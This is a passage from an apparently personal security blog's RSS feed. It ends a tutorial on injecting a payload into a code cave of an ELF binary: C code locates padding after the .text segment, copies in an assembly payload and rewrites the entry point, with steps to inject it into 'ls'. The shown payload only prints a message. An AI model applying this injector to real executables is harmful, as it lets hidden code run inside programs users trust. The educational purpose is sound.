&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phentsize);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cave_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; codecave;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; txt_segment;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I know this looks very intimidating at first but it’s not that hard after all. We basically take 4 arguments: the first is the pointer from the beginning of our file &lt;em&gt;(the one that we used to retrieve the elf header)&lt;/em&gt;, the second is just the file size and the last 2 are there just for retrieving back to the main program the offset to the padding and its size.&lt;/p&gt;
&lt;p&gt;So, after we have the elf header we can calculate the pointer to the program header table that stores all of our segments. We get the total number of segments by accessing the &lt;code&gt;e_phnum&lt;/code&gt; attribute.
Then, we just traverse all of the segments looking for a segment of type &lt;code&gt;PT_LOAD&lt;/code&gt; with read/execute permissions. Normally, there is only one and it’s containing the &lt;code&gt;.text&lt;/code&gt; section which contains the application code. When we find it, we store a pointer to it that we will return later and also calculate the offset to the end of the .text section.
Then we keep looking for segments with type &lt;code&gt;PT_LOAD&lt;/code&gt; and we calculate the padding between the 2 ones.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Normally there are only 2 &lt;code&gt;PT_LOAD&lt;/code&gt; segments, so this function can be improved. I will let this as an exercise for the reader. 😀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;the-payload&#34;&gt;The Payload&lt;/h2&gt;
&lt;p&gt;It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated for the reader, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;section .text
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    global _start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; save cpu state
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; your evil thing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;             ; syscall number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rdi, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;             ; fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;(stdout)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lea rsi, [rel msg]     ; pointer to &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; [])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rdx, msg_end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; msg ; size
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   syscall                ; ( SYS_write &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rax(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), buff &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsi(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;msg), size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx(len(msg)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; restore cpu state
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; jump to main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1111111111111111&lt;/span&gt;    ; set rax back to normal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   jmp rax                        ; jump to it
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;align &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   msg      db &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;... &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; ..&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.. .. &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; . &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. ... . &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.. . .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. .. &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. .... &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;··&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;··&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xae&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   msg_end  db &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ok, we just push everything to the stack, so we can get back the original state of the registers. Then we initialize the arguments on the specific registers making the system call afterwards. We restore the registers &lt;em&gt;(as we pushed them in the first place)&lt;/em&gt; and then set rax to the initial entry point of the program and jump to it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: We placed a placeholder there (&lt;code&gt;0x1111111111111111&lt;/code&gt;), so we can modify it from the injector script later.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;retrieving-the-payload&#34;&gt;Retrieving the payload&lt;/h3&gt;
&lt;p&gt;In order to retrieve the payload, we first need to find the .text section where the code resides. This is done via the &lt;code&gt;find_section&lt;/code&gt; function that takes as arguments a pointer to the start of the file and the section we want to search for.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p_txt_sec_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_section(data1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.text&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function gets the elf header using the pointer passed as the first argument and then calculates the start of the Section Program Header. Thus we get a pointer to it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Elf64_Shdr&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_section&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr_elf, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;query) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Set up the ptr to the elf header, section table.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Also, get the total numbers of sections and declare var for the section name.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ehdr 	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ptr_elf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;elf_sec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(ptr_elf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shoff);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; total_sec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sname;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Create a list that would fit all the section strings.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sec_strtab 			 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;elf_sec[ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shstrndx];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; sec_strtab_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr_elf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sec_strtab&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_offset; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Searching for %s section.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, query);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; total_sec; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sec_strtab_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; elf_sec[i].sh_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strcmp(sname, query))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] %s section found.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, query);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;elf_sec[i];	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		} 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to get the section names we need to access the String Header Section Table (&lt;code&gt;.shstrtab&lt;/code&gt;) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the .shstrtab by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the &lt;code&gt;sec_strtab_ptr&lt;/code&gt; the index where the name resides.&lt;/p&gt;
&lt;h3 id=&#34;processing-the-payload&#34;&gt;Processing The Payload&lt;/h3&gt;
&lt;p&gt;After we know where the &lt;code&gt;.text&lt;/code&gt; section of the payload is, we can check to see if the payload fits into the padding found earlier. Then copy the payload code at the end of the &lt;code&gt;.text&lt;/code&gt; section in the target file, using the offset returned by the &lt;code&gt;find_codecave&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// If the payload is to big to fit in the codecave, exit.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; cave_size)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Payload to big to inject.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(target_fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(payload_fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Inject payload
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	memmove(data &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end, data1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_offset, p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;finishing-it-up&#34;&gt;Finishing it up&lt;/h2&gt;
&lt;p&gt;Finally, with a little help of pointer dancing and the &lt;code&gt;patch_target&lt;/code&gt; function, we can change the entry point of the file with the evil one and replace the placeholder with the original entry point. I will not include the code here since this is basically just scanning the whole code of the payload, searching for the pattern passed by the second argument and replacing it with the entry point passed by the 4th argument.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Patch the return address after executing the payload
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;patch_target(data &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1111111111111111&lt;/span&gt;, p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size, (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)e_point);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Change entry point
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;elf_header&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_entry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Addr)(base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of concept&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Just compile the elf injector like any other normal C program: &lt;code&gt;gcc elf_inejctor.c -o elf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Generate the payload: &lt;code&gt;nasm -f elf64 -o payload.o payload.asm &amp;amp;&amp;amp; ld -o payload payload.o&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;RUN IT!: &lt;code&gt;./elf ls payload&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: If you want to inspect the code more carefully you can check it &lt;a href=&#34;https://github.com/vlagh3/elij&#34;&gt;@ my github&lt;/a&gt; as always&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;final-words&#34;&gt;Final words&lt;/h1&gt;
&lt;p&gt;In this article I have shown you a simple way of executing arbitrary code on an ELF file by injecting it.
I hope you enjoyed and now you can see how many things you can do if you master the ELF file structure.
I will come back with more things on ELF files because I have some ideas for the future. Until then, think of your own implementations!
Thank you for reading, and I will see you next time !&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Exploring the ELF file structure</title>
      <link>https://vlagh3.github.io/posts/elf_struct/</link>
      <pubDate>Tue, 14 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/posts/elf_struct/</guid>
      <description>Hello folks, hope you are all doing well because today we are going to talk about ELF files, but don’t be scared. Even if this topic offers a huge amount of information, I will try to make it as simple and fun as I can. With that being said, let’s talk a bit about the structure of this article. It will be split into the following parts:
General Information The anatomy of an ELF file Missconsceptions Linking and executing ELF Header Program headers Section headers Creating your own readelf Conclusion General Information So first of all, why would you want to bother learning about a specific file format that was adopted as a system default in UNIX almost 20 years ago?</description>
